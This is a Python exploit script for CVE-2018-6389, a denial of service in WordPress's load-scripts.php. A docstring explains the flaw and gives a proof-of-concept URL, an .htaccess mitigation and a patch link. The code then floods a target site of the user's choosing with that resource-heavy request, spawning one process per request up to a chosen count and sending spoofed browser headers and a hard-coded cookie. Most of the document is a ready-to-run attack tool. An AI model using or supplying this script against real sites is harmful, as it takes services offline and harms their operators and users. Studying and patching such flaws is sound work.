
__doc__ = '''

=========================================

WordPress DOS trough 'load-scripts.php'
CVE-ID: CVE-2018-6389

[-] Author: Deyaa Muhammad
[-] Twitter: @deyaamuhammad

=========================================

Description:
======================

Unauthenticated attackers can cause a denial of service (resource consumption) by using the large list of registered .js files (from wp-includes/script-loader.php) to construct a series of requests to load every file many times.

WordPress allows users to load multiple JS files and CSS files through load-scripts.php files at once.
For example, https://wpwebsite.com/wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-ui-core,editor&ver=4.9.1,
file load-scripts.php will load jquery-ui-core and editor files automatically and return the contents of the file.

However, the number and size of files are not restricted in the process of loading JS files, 
attackers can use this function to drain server resources and launch denial of service attacks.



More Details:
======================
https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html


POC:
======================
https://www.example.com/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter


FIX:
======================
The web application firewall will mitigate attacks by adding the following to .htaccess -file:

<Files load-scripts.php>
Order allow, deny
Deny from all
</Files>


CVE-ID:
======================
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389


PATCH:
======================
https://github.com/Jetserver/CVE-2018-6389-FIX

'''

import argparse
import requests
import threading
import multiprocessing
from urllib.parse import urlparse


class WPDOSLoader:

	def __init__(self, url, timeout=10, *args, **kwargs):

		self.response = None
		self.session = None

		self.request(url, timeout)

	def request(self, url, timeout):

		try:

			url = f"{url}/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter"

			parse = urlparse(url)

			headers = {
				"Host": parse.netloc,
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:76.0) Gecko/20100101 Firefox/76.0",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
				"Accept-Language": "en-US,en;q=0.5",
				"Accept-Encoding": "gzip, deflate, br",
				"Connection": "keep-alive",
				"Cookie": "__cfduid=d9a16aec00183131798765ae71ce3e6f61591043656; __gads=ID=a82ca84854c570c3:T=1591043666:S=ALNI_MbhZikvAA047VbrhqROHCcg_wPJSg; _ga=GA1.2.775454136.1591043662; _gid=GA1.2.11930199.1591043681; _gat=1",
				"Upgrade-Insecure-Requests": "1",
			}

			self.session = requests.Session()
			self.response = self.session.get(url, headers=headers, timeout=timeout)

			if self.response.status_code == 200:
				print("Request Sent Successfully.")
				return True
			else:
				print(f"Request Failed status_code ({self.response.status_code}).")
				return False

		except:
			print(f"Error happpened during sending the request.")
			return False


if __name__ == '__main__':

	print(__doc__)
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", "--url", required=True, help="Target URL.")
	parser.add_argument("-t", "--timeout", default=10, type=int, help="Request Timeout.")
	parser.add_argument("-c", "--count", default=1, type=int, help="Requests Count.")
	args = parser.parse_args()

	for i in range(args.count):
		# x = threading.Thread(target=WPDOSLoader, args=(args.url, args.timeout))
		# x.start()
		
		x = multiprocessing.Process(target=WPDOSLoader, args=(args.url, args.timeout))
		x.start()
	